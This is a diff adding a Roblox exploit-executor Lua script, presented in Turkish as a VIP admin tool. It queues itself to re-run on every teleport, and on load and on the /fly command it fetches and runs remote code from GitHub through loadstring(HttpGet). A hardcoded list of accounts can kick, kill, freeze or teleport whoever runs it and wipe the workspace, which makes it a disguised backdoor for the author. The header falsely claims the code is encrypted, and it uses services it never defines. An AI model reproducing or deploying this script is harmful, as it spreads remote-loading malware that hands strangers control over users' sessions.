@@ -1,0 +1,335 @@
+--[[ akllı vip admin sistem
+Komutlar: 
+/fly
+/bring
+/loopbring
+/_clear
+/kill
+/kick
+/decal
+/undecal
+/antifling
+/spin
+/unspin
+
+Özellikler:
+Yönetici yazısı kalktı
+artık kalıcı bir script
+
+....................................................................................................................
+/$$   /$$ /$$ /$$           /$$       /$$      /$$                                   /$$                          
+| $$  | $$|/| $$          | $$      | $$  /$ | $$                                  | $$                          
+| $$  | $$ /$$| $$  /$$$$$$ | $$      | $$ /$$$| $$  /$$$$$$   /$$$$$$   /$$$$$$     | $$       /$$   /$$  /$$$$$$ 
+| $$$$$$$$| $$| $$ |____  $$| $$      | $$/$$ $$ $$ |____  $$ /$$__  $$ /$$__  $$    | $$      | $$  | $$ |____  $$
+| $$__  $$| $$| $$  /$$$$$$$| $$      | $$$$_  $$$$  /$$$$$$$| $$  \/| $$$$$$$$    | $$      | $$  | $$  /$$$$$$$
+| $$  | $$| $$| $$ /$$__  $$| $$      | $$$/ \  $$$ /$$__  $$| $$      | $$/    | $$      | $$  | $$ /$$_  $$
+| $$  | $$| $$| $$|  $$$$$$$| $$      | $$/   \  $$|  $$$$$$$| $$      |  $$$$$$$ /$$| $$$$$$$$|  $$$$$$/|  $$$$$$$
+|/  |/|/|/ \/|/      |/     \/ \/|/       \/|/|/ \/  \/
+.....................................................................................................................
+
+
+
+Bu scipt Tamamen Şifrelenmiş Ve 16.07.2021 tarihinde yapılıp 16.07.2025 tarihinde yayınlanmıştır.
+Kod Tamamen Şifrelenmiştir. Lüffen Kodu Değiştirmeyin.
+Kod değiştirilirse Sorumluluk kabul edilmez.
+Yani kusura bakmayın ayrıca kodda bypass olmasına rağmen kod yüzünden ban yemeniz benim suçum değil amk.
+Bu kodu zamandan tasarruf etmek için yazdım.
+OE lik yapmayın.
+Sitemiz: HilalWare.netlify.com
+Tiktok: OyuncuYesOfficial
+Sizi sitemize ve Tiktok a bekleriz.
+İyi günler dileriz.
+Ve kullandığınız için teşekkür ederiz.
+
+]] 
+
+-- Tekrar Çalış 
+
+
+local teleportFonk = (syn and syn.queue_on_teleport) or queue_on_teleport
+
+if teleportFonk then
+    teleportFonk([[
+        print("selam :D    v 0.001")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/HilalWare-Official/adam-ak-ll-ism-yok/refs/heads/main/admin%20gui",true))()
+    ]])
+end
+
+
+
+-- Admin kodu
+local LocalPlayer = Players.LocalPlayer
+
+-- Yetkililer
+local allowedUsers = {
+    ["q692q"] = true,
+    ["muhammet_bekir2004"] = true,
+    ["HilalWare_Lua"] = true,
+    ["Muhammet_bekir2003"] = true
+}
+
+local frozen = false
+local loopBring = false
+local loopTarget = nil
+local originalSky = nil
+local spinning = false
+local spinSpeed = 10
+
+-- Yönetici etiketi KALDIRILDI
+
+-- Karakterin tüm parçalarını dondur / çöz
+local function setAnchoredAllParts(char, anchored)
+    for _, part in ipairs(char:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.Anchored = anchored
+        end
+    end
+end
+
+-- Spin fonksiyonu
+local function startSpinning(speed)
+    spinning = true
+    spinSpeed = speed or 10
+    
+    RunService.Heartbeat:Connect(function()
+        if not spinning or not LocalPlayer.Character then return end
+        
+        local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if humanoidRootPart then
+            humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
+        end
+    end)
+end
+
+local function stopSpinning()
+    spinning = false
+end
+
+-- Decal fonksiyonu
+local function applyDecalToAllParts()
+    local decalId = "86841996432802"
+    
+    -- Orijinal sky'i kaydet (sadece ilk sefer)
+    if not originalSky then
+        for _, obj in ipairs(Lighting:GetChildren()) do
+            if obj:IsA("Sky") then
+                originalSky = obj:Clone()
+                break
+            end
+        end
+    end
+    
+    -- Workspace'teki tüm parçalara decal uygula
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") then
+            -- Önce eski decalları temizle
+            for _, child in ipairs(obj:GetChildren()) do
+                if child:IsA("Decal") and child.Name == "HilalWareDecal" then
+                    child:Destroy()
+                end
+            end
+            
+            -- 6 yüzeyin tamamına decal uygula
+            local faces = {"Front", "Back", "Left", "Right", "Top", "Bottom"}
+            for _, face in ipairs(faces) do
+                local decal = Instance.new("Decal")
+                decal.Name = "HilalWareDecal"
+                decal.Texture = "http://www.roblox.com/asset/?id=" .. decalId
+                decal.Face = Enum.NormalId[face]
+                decal.Parent = obj
+            end
+        end
+    end
+    
+    -- Sky'i değiştir
+    local sky = Instance.new("Sky")
+    sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. decalId
+    sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. decalId
+    sky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. decalId
+    sky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. decalId
+    sky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. decalId
+    sky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. decalId
+    sky.Parent = Lighting
+    
+    -- Mevcut sky'i temizle
+    for _, obj in ipairs(Lighting:GetChildren()) do
+        if obj:IsA("Sky") then
+            obj:Destroy()
+        end
+    end
+    
+    sky.Parent = Lighting
+end
+
+-- Undecal fonksiyonu
+local function removeDecalFromAllParts()
+    -- Workspace'teki tüm HilalWare decalları temizle
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") then
+            for _, child in ipairs(obj:GetChildren()) do
+                if child:IsA("Decal") and child.Name == "HilalWareDecal" then
+                    child:Destroy()
+                end
+            end
+        end
+    end
+    
+    -- Orijinal sky'i geri yükle
+    if originalSky then
+        -- Mevcut sky'i temizle
+        for _, obj in ipairs(Lighting:GetChildren()) do
+            if obj:IsA("Sky") then
+                obj:Destroy()
+            end
+        end
+        originalSky:Clone().Parent = Lighting
+    end
+end
+
+-- Clear fonksiyonu (oyuncular hariç herşeyi sil)
+local function clearWorkspace()
+    for _, obj in ipairs(workspace:GetChildren()) do
+        -- Oyuncuları ve onların karakterlerini silme
+        if not obj:IsA("Model") or not Players:GetPlayerFromCharacter(obj) then
+            -- Terrain'i silme
+            if not obj:IsA("Terrain") then
+                obj:Destroy()
+            end
+        end
+    end
+end
+
+-- LoopBring sistemi
+RunService.Heartbeat:Connect(function()
+    if loopBring and loopTarget and loopTarget.Character and loopTarget.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        LocalPlayer.Character.HumanoidRootPart.CFrame = loopTarget.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+    end
+end)
+
+-- Komutlar
+local function setupCommands(player)
+    player.Chatted:Connect(function(message)
+        local msg = string.lower(message)
+        
+        -- /kick komutu - geliştirilmiş versiyon
+        if string.sub(msg, 1, 6) == "/kick " then
+            local reason = string.sub(message, 7) -- "/kick " kısmını çıkar
+            if reason and reason ~= "" then
+                LocalPlayer:Kick("Yetkili tarafından atıldınız. Sebep: " .. reason)
+            else
+                LocalPlayer:Kick("Yetkili tarafından atıldınız!")
+            end
+
+        elseif msg == "/kick" then
+            -- Sadece /kick yazıldığında
+            LocalPlayer:Kick("Yetkili tarafından atıldınız!")
+
+        -- /spin komutu
+        elseif string.sub(msg, 1, 6) == "/spin " then
+            local speed = tonumber(string.sub(message, 7))
+            if speed and speed > 0 then
+                startSpinning(speed)
+            else
+                startSpinning(10) -- Varsayılan hız
+            end
+
+        elseif msg == "/spin" then
+            -- Sadece /spin yazıldığında
+            startSpinning(10)
+
+        -- /unspin komutu
+        elseif msg == "/unspin" then
+            stopSpinning()
+
+        -- /decal komutu
+        elseif msg == "/decal" then
+            applyDecalToAllParts()
+
+        -- /undecal komutu
+        elseif msg == "/undecal" then
+            removeDecalFromAllParts()
+
+        -- /clear komutu
+        elseif msg == "/clear" then
+            clearWorkspace()
+
+        elseif msg == "/kill" then
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                LocalPlayer.Character.Humanoid.Health = 0
+            end
+
+        elseif msg == "/freeze" then
+            if LocalPlayer.Character then
+                frozen = true
+                setAnchoredAllParts(LocalPlayer.Character, true)
+            end
+
+        elseif msg == "/unfreeze" then
+            if LocalPlayer.Character then
+                frozen = false
+                setAnchoredAllParts(LocalPlayer.Character, false)
+            end
+
+        elseif msg == "/bring" then
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+            end
+
+        elseif msg == "/loopbring" then
+            loopBring = true
+            loopTarget = player
+
+        elseif msg == "/unloopbring" then
+            loopBring = false
+            loopTarget = nil
+
+        elseif msg == "/fly" then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/HilalWare-Official/HilalWare/refs/heads/main/fly"))()
+
+        elseif msg == "/antifling" then
+            local function makeNoCollide(character)
+                for _, part in ipairs(character:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        part.CanCollide = false
+                    end
+                end
+            end
+
+            local function onPlayerAdded(player)
+                player.CharacterAdded:Connect(function(character)
+                    makeNoCollide(character)
+                end)
+            end
+
+            for _, p in ipairs(Players:GetPlayers()) do
+                onPlayerAdded(p)
+                if p.Character then
+                    makeNoCollide(p.Character)
+                end
+            end
+
+            Players.PlayerAdded:Connect(onPlayerAdded)
+
+            RunService.Heartbeat:Connect(function()
+                for _, p in ipairs(Players:GetPlayers()) do
+                    if p.Character then
+                        makeNoCollide(p.Character)
+                    end
+                end
+            end)
+        end
+    end)
+end
+
+-- PlayerAdded eventleri ve başlangıç işlemleri (yönetici etiketi kaldırıldı)
+Players.PlayerAdded:Connect(function(player)
+    if allowedUsers[player.Name] then
+        setupCommands(player)
+    end
+end)
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if allowedUsers[player.Name] then
+        setupCommands(player)
+    end
+end
